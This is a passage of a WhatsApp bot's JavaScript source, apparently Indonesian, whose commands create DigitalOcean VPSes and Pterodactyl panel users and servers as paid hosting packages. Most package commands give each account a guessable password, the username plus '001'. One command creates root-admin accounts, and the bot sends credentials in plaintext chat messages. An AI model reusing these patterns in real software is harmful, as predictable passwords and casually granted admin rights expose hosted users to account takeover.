      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break        
     case "vps8g4c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-4vcpu-8gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break
case "crateadmin1": {
if (!isOwner) return reply(`*Lu Siape? Fitur Ini Khusus Owner Gw!*`)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = generateRandomPassword();
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: ${domain}
`
    const listMessage = {

        text: tks,

    }

	

    await Biiofc.sendMessage(m.chat, listMessage)

    await Biiofc.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

USERNAME :  ${username}
PASSWORD: ${password}
LOGIN: ${domain}


*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*


`,

    })

} 
        break
case "tutorial1": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner && !isPremium) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *TUTOR RUN* )▭▬▭

*TUTOR RUN BOT*
( https://youtu.be/cMrW4hqnB8o )

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
 case "addsrv1": {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
let s = text.split(',');
if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
        break
case "addusr1": {

if (!isOwner) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let t = text.split(',');
if (t.length < 3) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = await Biiofc.sendMessage(m.chat, { text: `
*SUCCESSFULLY ADD USER*

╭─❏ *『 USER INFO 』*
┣❐ ➤ *ID* : ${user.id}
┣❏ ➤ *USERNAME* : ${user.username}
┣❏ ➤ *EMAIL* : ${user.email}
┣❏ ➤ *NAME* : ${user.first_name} ${user.last_name}
┣❏ ➤ *CREATED AT* :  ${tanggal}
┗⬣ *PASSWORD BERHASIL DI KIRIM KE @${u.split`@`[0]}*`, mentions:[u],
})
Biiofc.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
╭─❏ *『 USER INFO 』*
┣❏ ➤ *📧EMAIL* : ${email}
┣❏ ➤ *👤USERNAME* : ${username}
┣❏ ➤ *🔐PASSWORD* : ${password.toString()}
┣❏ ➤ *🌐LOGIN* : ${domain}
┗⬣`,
})
}
break
 case "srvpaket1": {
       if (cekSaldo(sender,db_saldo) < 3000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp3.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Rafathar"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "10"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`DONE BY SanZ Offcial⚡

 *DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}
 *😎PEMILIK SERVER* : *${namaCreator}*

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
𝐃𝐎𝐍𝐄 𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐀𝐍𝐃𝐀 𝐒𝐔𝐃𝐀𝐇 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 𝐍𝐎𝐌𝐎𝐑 𝐓𝐄𝐑𝐒𝐄𝐁𝐔𝐓 ☑️
`)

}
minSaldo(sender, 3000, db_saldo)
break
case "srvpaket2": {
       if (cekSaldo(sender,db_saldo) < 4000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Rafathar"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "200"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 4000, db_saldo)
break
case "srvpaket3": {
       if (cekSaldo(sender,db_saldo) < 6000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp6.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Rafathar"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "300"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 6000, db_saldo)
break
case "srvpaket4": {
       if (cekSaldo(sender,db_saldo) < 8000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp8.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
       
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Rafathar"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "200"
let disk = "4000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 8000, db_saldo)
break
case "srvpaket5": {
       if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Rafathar"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "500"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 10000, db_saldo)
break
case "srvpaket6": {
       if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
       
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Rafathar"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 20000, db_saldo)
break
case "srvpaket7": {
       if (cekSaldo(sender,db_saldo) < 12000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp12.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Rafathar"
let egg = global.eggsnya
let loc = global.location
let memo = "6000"
let cpu = "450"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/45b3f02531a5a32793366.jpg" 
if (!u) return
